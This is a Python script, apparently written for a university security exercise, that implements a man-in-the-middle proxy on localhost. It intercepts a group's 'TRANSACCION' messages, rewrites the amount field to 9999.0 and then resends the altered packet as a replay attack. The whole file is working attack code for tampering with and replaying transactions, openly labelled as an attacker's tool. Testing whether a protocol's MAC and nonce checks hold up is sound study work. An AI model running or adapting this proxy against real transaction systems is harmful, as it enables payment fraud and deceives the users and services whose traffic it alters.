import socket
import threading
import time

# -----------------------------
# CONFIGURACIÓN DEL ATACANTE
# -----------------------------
# El puerto falso donde vamos a engañar al cliente para que se conecte
PUERTO_FALSO = 3444 

# A dónde vamos a reenviar el tráfico (el servidor real de la víctima)
HOST_REAL = "127.0.0.1"
PUERTO_REAL = 3443 

def reenviar_datos(origen, destino, direccion):
    while True:
        try:
            datos = origen.recv(4096)
            if not datos:
                break
            
            mensaje = datos.decode('utf-8', errors='ignore')
            
            if direccion == "CLIENTE -> SERVIDOR":
                print(f"\n[+] Interceptado ({direccion}): {mensaje}")
                
                # ======================================================
                # ZONA DE ATAQUE: MAN-IN-THE-MIDDLE (MitM)
                # ======================================================
                if "TRANSACCION" in mensaje:
                    print("[!] ¡Modificando transacción al vuelo (MitM)!")
                    # Formato de vuestro grupo: TRANSACCION:token:origen:destino:cantidad:nonce:mac
                    partes = mensaje.split(':')
                    
                    if len(partes) >= 7:
                        # Cambiamos la cantidad (índice 4) a 9999
                        partes[4] = "9999.0" 
                        # Reconstruimos el mensaje manipulado
                        datos_manipulados = ":".join(partes).encode()
                        print(f"[!] Paquete modificado: {datos_manipulados.decode()}")
                        
                        # Enviamos el paquete manipulado en lugar del original
                        destino.sendall(datos_manipulados)
                        
                        # ======================================================
                        # ZONA DE ATAQUE: REPLAY (Repetición)
                        # ======================================================
                        print("[!] Esperando 1 segundo para lanzar ataque de Replay...")
                        time.sleep(1)
                        print("[!] Reenviando paquete clonado (Replay)")
                        destino.sendall(datos_manipulados) # Lo mandamos por segunda vez
                        
                        continue # Saltamos el envío normal porque ya hemos enviado el manipulado
                
            elif direccion == "SERVIDOR -> CLIENTE":
                print(f"\n[-] Interceptado ({direccion}): {mensaje}")

            # Envío normal si no hemos manipulado nada
            destino.sendall(datos)
            
        except Exception as e:
            print(f"[x] Conexión cerrada en {direccion}")
            break

def manejar_conexion(cliente_socket):
    # Conectamos con el servidor real
    servidor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        servidor_socket.connect((HOST_REAL, PUERTO_REAL))
    except Exception as e:
        print("[x] No se pudo conectar al servidor real. ¿Está encendido?")
        cliente_socket.close()
        return

    # Creamos dos hilos: uno para escuchar al cliente y otro al servidor
    hilo_c2s = threading.Thread(target=reenviar_datos, args=(cliente_socket, servidor_socket, "CLIENTE -> SERVIDOR"))
    hilo_s2c = threading.Thread(target=reenviar_datos, args=(servidor_socket, cliente_socket, "SERVIDOR -> CLIENTE"))
    
    hilo_c2s.start()
    hilo_s2c.start()

def iniciar_proxy():
    proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    proxy.bind(("127.0.0.1", PUERTO_FALSO))
    proxy.listen(5)
    proxy.settimeout(1.0)
    print(f"[*] PROXY ATACANTE ESCUCHANDO EN EL PUERTO {PUERTO_FALSO}...")
    print(f"[*] Reenviando tráfico al servidor real en {PUERTO_REAL}...")
    
    while True:
        try:
            cliente_conn, addr = proxy.accept()
            print(f"\n[*] ¡Víctima conectada desde {addr}!")
            threading.Thread(target=manejar_conexion, args=(cliente_conn,), daemon=True).start()
        except socket.timeout:
            pass # Respira y vuelve a mirar si hay conexiones o si pulsaste Ctrl+C
        except KeyboardInterrupt:
            print("\n[!] Apagando el proxy atacante...")
            break

if __name__ == "__main__":
    iniciar_proxy()